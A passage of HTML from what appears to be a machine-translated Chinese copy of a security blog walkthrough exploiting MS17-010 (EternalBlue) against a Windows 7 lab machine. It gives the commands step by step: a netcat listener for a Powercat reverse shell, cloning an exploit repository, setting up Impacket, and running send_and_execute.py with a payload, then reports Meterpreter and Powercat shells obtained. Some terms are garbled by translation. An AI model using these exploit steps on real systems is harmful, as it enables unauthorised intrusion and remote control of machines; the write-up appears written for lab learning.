jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在端口25上启动一个netcat监听器来捕获Powercat连接。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="1067" class="ld le iq kz b gy lf lg l lh li">rlwrap nc -nlvp 25</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/5531d8cd871cef249b6ff218cc9fb7f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*i6cF9v7bg4JlH19sW5Em0g.png"/></div></figure><p id="fa78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">准备MS17–010 exploit<br/>我们现在已经为有效载荷做好了准备。下一节是关于运行实际的利用。打开一个新的Bash终端实例来执行命令。</p><p id="2646" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">17.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="0856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载漏洞。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="16d9" class="ld le iq kz b gy lf lg l lh li">cd /tmp<br/>git clone <a class="ae lj" href="https://github.com/helviojunior/MS17-010.git" rel="noopener ugc nofollow" target="_blank">https://github.com/helviojunior/MS17-010.git</a></span></pre><p id="9ae9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">18.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="9b5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Impacket文件夹中启动Python2环境</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="6b48" class="ld le iq kz b gy lf lg l lh li">cd /opt/impacket<br/>sudo virtualenv impacket-venv -p $(which python2)<br/>source impacket-venv/bin/activate</span></pre><p id="e266" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">19.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="48c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Python2虚拟环境'(impacket-venv)'中，使用我们的有效负载文件(/tmp/ruby.exe)对我们的目标(192.168.62.169)运行漏洞利用</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="7b0e" class="ld le iq kz b gy lf lg l lh li">python2 /tmp/MS17-010/send_and_execute.py 192.168.62.169 /tmp/ruby.exe</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/2fda36c003ce2d91d927b7aaa87a8140.png" data-original-src="https://miro.medium.com/v2/resize:fit:1212/format:webp/1*AhiuxsTO6cKHh9qV6zLr7Q.png"/></div></figure><p id="4c1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看我们的结果:</p><p id="57ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">HTTP侦听器</p><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/3045c35b2f04f872f285a76b695b1e86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1232/format:webp/1*0P-xjbZovamSrVbzfhaWHw.png"/></div></figure><p id="4a53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有文件都已下载。有些文件我们下载了不止一次，这是因为在PowerShell不可用的情况下的冗余。</p><p id="91a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ICPM听众</p><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/0b74887e763a55293bad916e2c455e97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*ouIJVkemhe-eSHK-l5b4lw.png"/></div></figure><p id="afa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有网络连接(我们已经知道了这一点，因为我们的HTTP侦听器受到了攻击)。</p><p id="cc91" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PHP抄表员监听器</p><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi na"><img src="../Images/aa3150f8ddbbbd33bdf13bd83b861905.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4gl07C2MTjxG36eU2d1yJw.png"/></div></div></figure><p id="5a23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找到了一个米普雷特弹壳。您还可以将有效负载更改为非meterpreter shell。</p><p id="4859" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Powercat监听器</p><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/007a315f17861246a08874986fb180ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Puy-JugVwPJpZLuh8-ooQg.png"/></div></figure><p id="fad5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这成功了！</p><p id="b18b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们针对Windows 7目标的攻击使用了两种不同的shells。</p><p id="a181" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我的下一篇博客中，我将展示如何用XP目标来做这件事，root“Alice”也可以。</p></div><div class="ab cl ng nh hu ni" role="separator"><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl"/></div><div class="ij ik il im in"><h2 id="fcea" class="ld le iq bd nn no np dn nq nr ns dp nt jy nu nv nw kc nx ny nz kg oa ob oc od bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lj" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>